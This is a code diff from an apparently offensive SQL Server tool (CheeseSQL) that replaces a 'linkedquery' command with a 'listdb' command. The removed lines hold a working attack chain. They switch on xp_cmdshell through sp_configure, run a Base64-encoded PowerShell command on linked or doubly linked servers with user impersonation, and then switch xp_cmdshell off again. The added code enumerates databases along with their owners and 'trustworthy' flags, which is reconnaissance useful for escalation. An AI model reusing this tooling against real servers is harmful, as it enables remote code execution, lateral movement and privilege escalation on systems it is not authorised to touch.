@@ -3,16 +3,14 @@ using System;
 using System.Collections.Generic;
 using System.Data.SqlClient;
 
-
 namespace CheeseSQL.Commands
 {
-    public class linkedqueryxp : ICommand
+    public class listdb : ICommand
     {
-        public static string CommandName => "linkedquery";
-
+        public static string CommandName => "listdb";
         public string Description()
         {
-            return $"Execute Encoded PowerShell Command on Linked SQL Server via 'OPENQUERY'";
+            return $"List available Databases on the server";
         }
 
         public string Usage()
@@ -20,10 +18,10 @@ namespace CheeseSQL.Commands
             return $@"{Description()} 
 Required arguments:
   /server:SERVER                   Server to connect to
-  /target:TARGET                   Specify a linked SQL server as the target
-  /command:<B64-PWSH>              Command to execute
 
 Optional arguments:
+  /verbose                         If set, more info on the DB
+  /target:TARGET                   Specify a linked SQL server as the target
   /db:DB                           Specify an alternate database to connect 
   /impersonate:USER                Impersonate a user on the connect server
   /impersonate-intermediate:USER   Impersonate a user on the intermediate server
@@ -33,10 +31,12 @@ Optional arguments:
     /password:SQLPASSWORD          If /sqlauth, set the password for SQL authentication";
         }
 
+
         public void Execute(Dictionary<string, string> arguments)
         {
-            string connectInfo = "";
-            string cmd = "";
+            string connectInfo;
+            bool verbose;
+            bool exclude_default;
 
             ArgumentSet argumentSet;
             try
@@ -44,9 +44,7 @@ Optional arguments:
                 argumentSet = ArgumentSet.FromDictionary(
                     arguments,
                     new List<string>() {
-                        "/server",
-                        "/command",
-                        "/target"
+                        "/server"
                     });
             }
             catch (Exception e)
@@ -55,7 +53,8 @@ Optional arguments:
                 return;
             }
 
-            argumentSet.GetExtraString("/command", out cmd);
+            argumentSet.GetExtraBool("/verbose", out verbose);
+            argumentSet.GetExtraBool("/nodefault", out exclude_default);
 
             SqlConnection connection;
             SQLExecutor.ConnectionInfo(arguments, argumentSet.connectserver, argumentSet.database, argumentSet.sqlauth, out connectInfo);
@@ -76,41 +75,60 @@ Optional arguments:
                 SQLExecutor.ExecuteProcedure(connection, "", argumentSet.impersonate);
             }
 
+            string select = verbose ? 
+                "name AS 'Database', suser_sname(owner_sid) AS 'Owner', is_trustworthy_on AS 'Trustworthy'": 
+                "name AS 'Database'" ;
+
+            string where = exclude_default ?
+                "WHERE name NOT IN('master', 'tempdb', 'model', 'msdb')" :
+                "";
+
             var queries = new List<string>();
-
-            queries.Add("SELECT 1 as 'Enabling Advanced Options'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;");
-            queries.Add("SELECT 1 as 'Enabling xp_cmdshell'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;");
-            queries.Add($"SELECT 1 as 'Executing command'; EXEC xp_cmdshell 'powershell -enc {cmd}';");
-            queries.Add("SELECT 1 as 'Disabling xp_cmdshell'; EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;");
-            queries.Add("SELECT 1 as 'Disabling Advanced Options'; EXEC sp_configure 'show advanced options', 0; RECONFIGURE;");
-
+            
+            queries.Add(
+                $@"SELECT {select} FROM sys.databases {where};"
+             );
+ 
             foreach (string query in queries)
             {
-                if (String.IsNullOrEmpty(argumentSet.intermediate))
+                if (String.IsNullOrEmpty(argumentSet.target) && String.IsNullOrEmpty(argumentSet.intermediate))
+                {
+                    SQLExecutor.ExecuteQuery(
+                        connection, 
+                        query,
+                        argumentSet.impersonate,
+                        true
+                        );
+                }
+                else if (String.IsNullOrEmpty(argumentSet.intermediate))
                 {
                     SQLExecutor.ExecuteLinkedQuery(
                         connection, 
-                        query,
-                        argumentSet.target,
-                        argumentSet.impersonate,
-                        argumentSet.impersonate_linked
+                        query, 
+                        argumentSet.target, 
+                        argumentSet.impersonate, 
+                        argumentSet.impersonate_linked,
+                        true
                         );
                 }
-                else 
+                else
                 {
                     SQLExecutor.ExecuteDoublyLinkedQuery(
                         connection, 
-                        query,
-                        argumentSet.target,
-                        argumentSet.intermediate,
-                        argumentSet.impersonate,
-                        argumentSet.impersonate_linked,
-                        argumentSet.impersonate_intermediate
+                        query, 
+                        argumentSet.target, 
+                        argumentSet.intermediate, 
+                        argumentSet.impersonate, 
+                        argumentSet.impersonate_linked, 
+                        argumentSet.impersonate_intermediate,
+                        true
                         );
                 }
             }
-
             connection.Close();
+
         }
     }
+
+
 }
